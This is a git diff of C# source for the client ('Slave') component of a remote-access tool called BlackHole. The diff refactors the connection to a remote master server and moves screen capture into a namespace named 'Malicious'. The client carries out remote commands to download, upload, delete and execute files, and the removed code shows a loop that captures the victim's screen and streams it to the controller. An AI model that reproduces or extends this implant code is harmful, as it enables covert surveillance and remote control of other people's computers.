@@ -9,6 +9,7 @@ using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
 using BlackHole.Slave.Helper;
 using BlackHole.Slave.Helper.Native.Impl;
+using BlackHole.Slave.Malicious;
 using NetMQ;
 using NetMQ.Sockets;
 
@@ -17,32 +18,25 @@ namespace BlackHole.Slave
     /// <summary>
     /// 
     /// </summary>
-    public sealed class MasterServer
+    public sealed class MasterServer : Singleton<MasterServer>
     {
         public const int DISCONNECTION_TIMEOUT = 8000;
         public const int SEND_INTERVAL = 10;
         public const int RECEIVE_INTERVAL = 10;
         
-        private CancellationTokenSource m_screenCaptureTokenSource;
         private readonly Stopwatch m_receiveTimer;
         private readonly NetMQSocket m_client;
         private readonly NetMQPoller m_poller;
         private readonly ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
-        private readonly string m_serverAddress;
+        private string m_serverAddress;
         private bool m_connected;
         private long m_lastReceived = -1;
-
-        private bool IsCapturingScreen => !m_screenCaptureTokenSource.IsCancellationRequested;
 
         /// <summary>
         /// 
         /// </summary>
-        public MasterServer(string serverAddress)
+        public MasterServer()
         {
-            m_screenCaptureTokenSource = new CancellationTokenSource();
-            m_screenCaptureTokenSource.Cancel();
-
-            m_serverAddress = serverAddress;
             m_client = new DealerSocket();
             m_client.Options.Linger = TimeSpan.Zero;
             m_client.ReceiveReady += ClientReceive;
@@ -52,8 +46,16 @@ namespace BlackHole.Slave
             var sendTimer = new NetMQTimer(SEND_INTERVAL);
             sendTimer.Elapsed += SendQueue;
 
-            m_poller = new NetMQPoller {sendTimer, m_client};
+            m_poller = new NetMQPoller { sendTimer, m_client };
             //m_poller.PollTimeout = 10;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public void Connect(string serverAddress) 
+        {
+            m_serverAddress = serverAddress;
             m_poller.RunAsync();
             m_client.Connect(m_serverAddress);
 
@@ -108,7 +110,7 @@ namespace BlackHole.Slave
         private void SetDisconnected()
         {
             m_connected = false;
-            CancelScreenCapture();
+            ScreenCapture.Instance.StopScreenCapture();
             ClearSendQueue();
         }
 
@@ -152,8 +154,8 @@ namespace BlackHole.Slave
                 .With<DownloadFilePartMessage>(DownloadFilePart)
                 .With<UploadFileMessage>(UploadFile)
                 .With<DeleteFileMessage>(DeleteFile)
-                .With<StartScreenCaptureMessage>(StartScreenCapture)
-                .With<StopScreenCaptureMessage>(StopScreenCapture)
+                .With<StartScreenCaptureMessage>(ScreenCapture.Instance.StartScreenCapture)
+                .With<StopScreenCaptureMessage>(ScreenCapture.Instance.StopScreenCapture)
                 .With<ExecuteFileMessage>(ExecuteFile)
                 .Default(m =>
                 {
@@ -172,7 +174,7 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(int windowId, long operationId, string operation, Exception exception) => 
+        public void SendStatus(int windowId, long operationId, string operation, Exception exception) => 
             SendStatus(windowId, operationId, operation, false, "Failed : " +  exception);
 
         /// <summary>
@@ -180,7 +182,7 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(int windowId, long operationId, string operation, string message) => 
+        public void SendStatus(int windowId, long operationId, string operation, string message) => 
             SendStatus(windowId, operationId, operation, true, message);
 
         /// <summary>
@@ -188,7 +190,7 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(int windowId, string operation, string message) => 
+        public void SendStatus(int windowId, string operation, string message) => 
             SendStatus(windowId, -1, operation, message);
 
         /// <summary>
@@ -196,7 +198,7 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendFailedStatus(int windowId, string operation, string message) => 
+        public void SendFailedStatus(int windowId, string operation, string message) => 
             SendStatus(windowId, -1, operation, false, "Failed : " + message);
 
         /// <summary>
@@ -207,7 +209,7 @@ namespace BlackHole.Slave
         /// <param name="success"></param>
         /// <param name="message"></param>
         /// <param name="windowId"></param>
-        private void SendStatus(int windowId, long operationId, string operation, bool success, string message)
+        public void SendStatus(int windowId, long operationId, string operation, bool success, string message)
         {
             Send(new StatusUpdateMessage
             {
@@ -244,7 +246,7 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="sucessMessage"></param>
-        private void ExecuteSimpleOperation(int windowId, long operationId, string operationName,
+        public void ExecuteSimpleOperation(int windowId, long operationId, string operationName,
             Action operation, string sucessMessage)
         {
             Utility.ExecuteComplexOperation(() =>
@@ -265,7 +267,7 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="messageBuilder"></param>
-        private void ExecuteSimpleOperation<T>(int windowId, string operationName,
+        public void ExecuteSimpleOperation<T>(int windowId, string operationName,
             Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
             => ExecuteComplexSendOperation(windowId, operationName, operation, message =>
                 SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message)));
@@ -277,7 +279,7 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
+        public void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
             => ExecuteComplexSendOperation(windowId, operationName, operation, x => { });
 
         /// <summary>
@@ -287,7 +289,7 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, 
+        public void ExecuteComplexSendOperation<T>(int windowId, string operationName, 
             Func<T> operation, Action<T> success) where T : NetMessage
             => ExecuteComplexSendOperation(windowId, -1, operationName, operation, success);
 
@@ -300,7 +302,7 @@ namespace BlackHole.Slave
         /// <param name="operation"></param>
         /// <param name="success"></param>
         /// <param name="windowId"></param>
-        private void ExecuteComplexSendOperation<T>(int windowId, long operationId, string operationName,
+        public void ExecuteComplexSendOperation<T>(int windowId, long operationId, string operationName,
             Func<T> operation, Action<T> success) where T : NetMessage
         {
             Utility.ExecuteComplexOperation(operation, message =>
@@ -398,56 +400,6 @@ namespace BlackHole.Slave
                 () => FileHelper.DeleteFile(message.FilePath),
                 deletion => $"{deletion.FilePath}");
         }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="message"></param>
-        private void StartScreenCapture(StartScreenCaptureMessage message)
-        {
-            if (IsCapturingScreen)
-                return;
-            m_screenCaptureTokenSource = new CancellationTokenSource();
-
-            SendStatus(message.WindowId, "Screen capture", "Started capturing...");
-
-            // we dont assign it now so that we can use it in the lambda itself
-            Action sendCapture = null;
-            sendCapture = async () =>
-            {
-                try
-                {
-                    ExecuteComplexSendOperation(message.WindowId,
-                        "Screen capture",
-                        () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));
-
-                    m_screenCaptureTokenSource.Token.ThrowIfCancellationRequested();
-
-                    // capture rate FPS
-                    await Task.Delay(TimeSpan.FromMilliseconds(1000 / message.Rate));
-
-                    // continue
-                    await Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
-                }
-                catch (Exception e)
-                {
-                    // cancelled
-                    SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
-                }
-            };
-            Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
-        }
-        
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="message"></param>
-        private void StopScreenCapture(StopScreenCaptureMessage message) => CancelScreenCapture();
-        
-        /// <summary>
-        /// 
-        /// </summary>
-        private void CancelScreenCapture() => m_screenCaptureTokenSource.Cancel();
         
         /// <summary>
         /// 
